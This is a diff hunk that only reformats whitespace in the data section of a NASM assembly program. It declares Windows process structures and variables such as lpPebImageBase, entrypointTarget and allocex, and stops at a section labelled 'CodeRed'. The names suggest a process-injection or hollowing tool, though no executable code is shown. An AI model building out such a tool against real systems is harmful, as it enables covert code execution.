@@ -6,80 +6,80 @@ section .BSS
 section .data	
 	
 struc PROCESSINFO
-	.hProcess 		resd 2
-	.hThread 		resd 2
-        .dwProcessId 	resd 1
-        .dwThreadId 	resd 1
+	.hProcess 			resd 2
+	.hThread 			resd 2
+        .dwProcessId 			resd 1
+        .dwThreadId 			resd 1
 endstruc
 	
 		
 ProcInfo istruc PROCESSINFO
-	at PROCESSINFO.hProcess,dd 0
-        at PROCESSINFO.hThread,dd 0
-        at PROCESSINFO.dwProcessId,dw 0
-        at PROCESSINFO.dwThreadId,dw 0
+	at PROCESSINFO.hProcess,	dd 0
+        at PROCESSINFO.hThread,		dd 0
+        at PROCESSINFO.dwProcessId,	dw 0
+        at PROCESSINFO.dwThreadId,	dw 0
 iend
 	
 	
 struc STARTUPINFOA 
         .cb resd 1
-        .lpReserved resb 8
-        .lpDesktop resb 8
-        .lpTitle resb 0xc
-        .dwX resd 1
-        .dwY resd 1
-        .dwXSize resd 1
-        .dwYSize resd 1
-        .dwXCountChars resd 1
-        .dwYCountChars resd 1
-        .dwFillAttribute resd 1
-        .dwFlags resd 1
-        .wShowWindow resw 1
-        .cbReserved2 resw 2
-        .lpReserverd2 resb 0xA
-        .hStdInput resd 2
-        .hStadOutput resd 2
-        .hStdError resd 2
+        .lpReserved 			resb 8
+        .lpDesktop 			resb 8
+        .lpTitle 			resb 0xc
+        .dwX 				resd 1
+        .dwY 				resd 1
+        .dwXSize 			resd 1
+        .dwYSize 			resd 1
+        .dwXCountChars 			resd 1
+        .dwYCountChars 			resd 1
+        .dwFillAttribute 		resd 1
+        .dwFlags 			resd 1
+        .wShowWindow 			resw 1
+        .cbReserved2 			resw 2
+        .lpReserverd2 			resb 0xA
+        .hStdInput 			resd 2
+        .hStadOutput 			resd 2
+        .hStdError 			resd 2
     endstruc
 	
 
 startup istruc STARTUPINFOA 
-       at STARTUPINFOA.cb, dd 0
-       at STARTUPINFOA.lpReserved, db 0
-       at STARTUPINFOA.lpDesktop, db 0
-       at STARTUPINFOA.lpTitle, db 0
-       at STARTUPINFOA.dwX, dd 0
-       at STARTUPINFOA.dwY, dd 0
-       at STARTUPINFOA.dwXSize, dd 0
-       at STARTUPINFOA.dwYSize, dd 0
-       at STARTUPINFOA.dwXCountChars, dd 0
-       at STARTUPINFOA.dwYCountChars, dd 0
+       at STARTUPINFOA.cb, 		dd 0
+       at STARTUPINFOA.lpReserved, 	db 0
+       at STARTUPINFOA.lpDesktop, 	db 0
+       at STARTUPINFOA.lpTitle, 	db 0
+       at STARTUPINFOA.dwX, 		dd 0
+       at STARTUPINFOA.dwY, 		dd 0
+       at STARTUPINFOA.dwXSize, 	dd 0
+       at STARTUPINFOA.dwYSize, 	dd 0
+       at STARTUPINFOA.dwXCountChars, 	dd 0
+       at STARTUPINFOA.dwYCountChars, 	dd 0
        at STARTUPINFOA.dwFillAttribute, dd 0
-       at STARTUPINFOA.dwFlags, dd 0
-       at STARTUPINFOA.wShowWindow, dw 0
-       at STARTUPINFOA.cbReserved2, dw 0
-       at STARTUPINFOA.lpReserverd2, db 0
-       at STARTUPINFOA.hStdInput, dd 0
-       at STARTUPINFOA.hStadOutput, dd 0
-       at STARTUPINFOA.hStdError, dd 0
+       at STARTUPINFOA.dwFlags, 	dd 0
+       at STARTUPINFOA.wShowWindow, 	dw 0
+       at STARTUPINFOA.cbReserved2, 	dw 0
+       at STARTUPINFOA.lpReserverd2, 	db 0
+       at STARTUPINFOA.hStdInput, 	dd 0
+       at STARTUPINFOA.hStadOutput, 	dd 0
+       at STARTUPINFOA.hStdError, 	dd 0
     iend
 
-    	TamArqProgram times 8 dq 0
-    	TamArqTarget times 8 dq 0
-    	bufferFileName times 32 db 0
-    	Buffer times 800000 db 0
-    	addressAlocado times 8 dq 0
-    	addressAlocadoEx times 8 dq 0
-    	handle times 8 dq 0
-    	entrypointTarget times 8 dq 0
-	GetSizeTarget times 8 dq 0
-	lpPebImageBase times 8 dq 0
-	openProcessH times 8 dq 0
-	lpContext times 8 dd 0 
-	allocex times 8 dd 0 
-	AddressEntryPoint times 8 dd 0
-	PID times 8 dd 0
-	alloc times 8 dd 0
+    	TamArqProgram times 8 		dq 0
+    	TamArqTarget times 8 		dq 0
+    	bufferFileName times 32 	db 0
+    	Buffer times 800000 		db 0
+    	addressAlocado times 8 		dq 0
+    	addressAlocadoEx times 8 	dq 0
+    	handle times 8 			dq 0
+    	entrypointTarget times 8 	dq 0
+	GetSizeTarget times 8 		dq 0
+	lpPebImageBase times 8 		dq 0
+	openProcessH times 8 		dq 0
+	lpContext times 8 		dd 0 
+	allocex times 8 		dd 0 
+	AddressEntryPoint times 8 	dd 0
+	PID times 8 			dd 0
+	alloc times 8 			dd 0
 	
 section .codered
 	CodeRed:
